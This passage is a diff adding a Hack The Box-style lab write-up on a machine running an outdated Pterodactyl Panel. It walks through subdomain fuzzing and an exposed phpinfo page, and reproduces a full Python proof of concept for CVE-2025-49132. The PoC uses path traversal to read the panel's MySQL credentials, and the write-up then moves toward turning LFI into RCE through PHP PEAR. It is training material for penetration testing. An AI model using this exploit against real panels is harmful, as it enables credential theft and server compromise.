@@ -61,5 +61,117 @@ Nmap done: 1 IP address (1 host up) scanned in 384.20 seconds
 Navigating to the web server shows what is seemingly a homepage for a minecraft server.
 <img width="2254" height="883" alt="image" src="https://github.com/user-attachments/assets/688e2ebe-adc6-4e66-ac18-3908f6e902d4" />
 
-We see that underneath the area where the IP is located, we see a changelog 
+We see that underneath the area where the IP is located, we see a changelog.
 <img width="677" height="520" alt="image" src="https://github.com/user-attachments/assets/c457dedf-bc4e-43ed-a989-c34b035e72fa" />
+
+There are a few things in this changelog that are important.
+- The Pterodactyl Panel version. This is an outdated version of this application.
+- PHP-RPM, PHP-pEAR, and phpinfo() are enabled.
+
+Immediately phpinfo being enabled is a red flag, and we can confirm this is the case by navigating to the phpinfo.php directory. Once we get there we see that we can see the PHP version the website uses, and all useful settings we can use to get more information.
+<img width="2258" height="1088" alt="image" src="https://github.com/user-attachments/assets/5ada8052-1669-4c27-8890-c119ca0f7513" />
+
+However, for now we enumerate more.
+
+Enumerating Directories and subdomains showed me no interesting directories (other than the changelog.txt file which we already found)
+```
+┌──(kali㉿kali)-[~/HTB_Labs/season_10/pterodactyl]
+└─$ ffuf -w /home/kali/Custom_Wordlists/wordlists/wordlists/htb/subdomains.txt:FUZZ -u http://pterodactyl.htb -H "Host: FUZZ.pterodactyl.htb" -fs 145
+
+        /'___\  /'___\           /'___\       
+       /\ \__/ /\ \__/  __  __  /\ \__/       
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
+         \ \_\   \ \_\  \ \____/  \ \_\       
+          \/_/    \/_/   \/___/    \/_/       
+
+       v2.1.0-dev
+________________________________________________
+
+ :: Method           : GET
+ :: URL              : http://pterodactyl.htb
+ :: Wordlist         : FUZZ: /home/kali/Custom_Wordlists/wordlists/wordlists/htb/subdomains.txt
+ :: Header           : Host: FUZZ.pterodactyl.htb
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
+ :: Filter           : Response size: 145
+________________________________________________
+
+panel                   [Status: 200, Size: 1897, Words: 490, Lines: 36, Duration: 407ms]
+[WARN] Caught keyboard interrupt (Ctrl-C)
+```
+
+Adding this subdomain to my host file, we see that this leads to the Pterodactyl panel we saw in the changelog file
+<img width="2256" height="759" alt="image" src="https://github.com/user-attachments/assets/5347efab-8861-4c53-a348-4d7e3cb64035" />
+
+Looking up if our version of Pterodactyl Panel is vulnerable, we see that there is a critical CVE (CVE-2025-49132) that leads unautheticated RCE.
+https://pentest-tools.com/vulnerabilities-exploits/pterodactyl-panel-remote-code-execution_27317
+
+Essentially, the /locales/locale.json file takes 2 inputs with parameters named `locale` and `namespace`. These parameters are improperly sanitized, allowing our raw input to be sent to the endpoint.
+
+The code below shows one of the PoCs that are used to check for the vulnerability, which gets the database credentials from this application.
+```
+# Exploit Title: Pterodactyl Panel 1.11.11 - Remote Code Execution (RCE)
+# Date: 22/06/2025
+# Exploit Author: Zen-kun04
+# Vendor Homepage: https://pterodactyl.io/
+# Software Link: https://github.com/pterodactyl/panel
+# Version: < 1.11.11
+# Tested on: Ubuntu 22.04.5 LTS
+# CVE: CVE-2025-49132
+
+
+import requests
+import json
+import argparse
+import colorama
+import urllib3
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+
+arg_parser = argparse.ArgumentParser(
+    description="Check if the target is vulnerable to CVE-2025-49132.")
+arg_parser.add_argument("target", help="The target URL")
+args = arg_parser.parse_args()
+
+try:
+    target = args.target.strip() + '/' if not args.target.strip().endswith('/') else args.target.strip()
+    r = requests.get(f"{target}locales/locale.json?locale=../../../pterodactyl&namespace=config/database", allow_redirects=True, timeout=5, verify=False)
+    if r.status_code == 200 and "pterodactyl" in r.text.lower():
+        try:
+            raw_data = r.json()
+            data = {
+                "success": True,
+                "host": raw_data["../../../pterodactyl"]["config/database"]["connections"]["mysql"].get("host", "N/A"),
+                "port": raw_data["../../../pterodactyl"]["config/database"]["connections"]["mysql"].get("port", "N/A"),
+                "database": raw_data["../../../pterodactyl"]["config/database"]["connections"]["mysql"].get("database", "N/A"),
+                "username": raw_data["../../../pterodactyl"]["config/database"]["connections"]["mysql"].get("username", "N/A"),
+                "password": raw_data["../../../pterodactyl"]["config/database"]["connections"]["mysql"].get("password", "N/A")
+            }
+            print(f"{colorama.Fore.LIGHTGREEN_EX}{target} => {data['username']}:{data['password']}@{data['host']}:{data['port']}/{data['database']}{colorama.Fore.RESET}")
+        except json.JSONDecodeError:
+            print(colorama.Fore.RED + "Not vulnerable" + colorama.Fore.RESET)
+        except TypeError:
+            print(colorama.Fore.YELLOW + "Vulnerable but no database" + colorama.Fore.RESET)
+    else:
+        print(colorama.Fore.RED + "Not vulnerable" + colorama.Fore.RESET)
+except requests.RequestException as e:
+    if "NameResolutionError" in str(e):
+        print(colorama.Fore.RED + "Invalid target or unable to resolve domain" + colorama.Fore.RESET)
+    else:
+        print(f"{colorama.Fore.RED}Request error: {e}{colorama.Fore.RESET}")
+```
+
+Remaking this in burpsuite, we can confirm that we get RCE via LFI.
+<img width="1598" height="896" alt="image" src="https://github.com/user-attachments/assets/b59948ad-bda6-4d76-99f7-d4e1de20df1b" />
+
+However, so far this by itself doesn't allow for RCE in a way that can give us a shell, so we enumerate further.
+
+Going back to the `changelog.txt` file, I remember that php-pear was enabled, which is an open-source php package manager that has multiple critical vulnerabilities associated with it. One of these allow for RCE.
+
+The article below shows methods that php pear is used to change LFI to command execution
+https://medium.com/@lashin0x/local-file-inclusion-to-remote-code-execution-rce-bea0ec06342a
+
+
